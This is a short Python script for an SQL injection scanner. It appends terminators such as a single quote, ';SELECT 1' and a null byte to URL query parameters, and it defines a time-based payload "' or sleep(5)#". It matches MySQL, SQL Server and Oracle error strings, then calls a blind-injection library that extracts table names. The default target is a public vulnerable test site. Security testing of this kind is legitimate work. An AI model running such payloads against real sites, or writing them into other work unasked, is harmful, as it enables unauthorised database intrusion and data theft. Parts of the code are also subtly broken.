from urllib.parse import urlparse
import re
import requests
from bs4 import BeautifulSoup as bs
import Blinder


class sql:
    payloads = ["'", '#', "' or sleep(5)#"]
    value_terminators = ["'", ";SELECT 1", "%00"]

    def __init__(self, url):
        self.url = url

    def identify_url(self):
        url_scheme = urlparse(self.url)
        return url_scheme

    def fuzz_url(self, url_scheme):
        if url_scheme.query != "":
            for term in sql.value_terminators:
                link = url_scheme.scheme + "://" + url_scheme.netloc + "/" \
                       + url_scheme.path + "?" + url_scheme.query + term
                content = bs(requests.get(link).content, "html.parser")
                vulnerability = is_vulnerable(content, link)
                if not vulnerability:
                    is_blind(self.url)


def is_vulnerable(response, url):
    errors = [
        # MySQL
        "you have an error in your sql syntax;",
        "Warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
    ]

    for error in errors:
        if len(response.body.find_all(text=re.compile(error))) > 0:
            print("SQL Injection at {}".format(url))
            return True
        else:
            continue
    return False


def is_blind(url):
    blindCheck = Blinder.blinder(url, sleep=2)
    if blindCheck.check_injection():
        print("Blind SQL Injection at {}".format(url))
        print(blindCheck.get_tables())


if __name__ == '__main__':
    sqlscanner = sql("http://testphp.vulnweb.com/listproducts.php?cat=1")
    sqlscanner.fuzz_url(sqlscanner.identify_url())
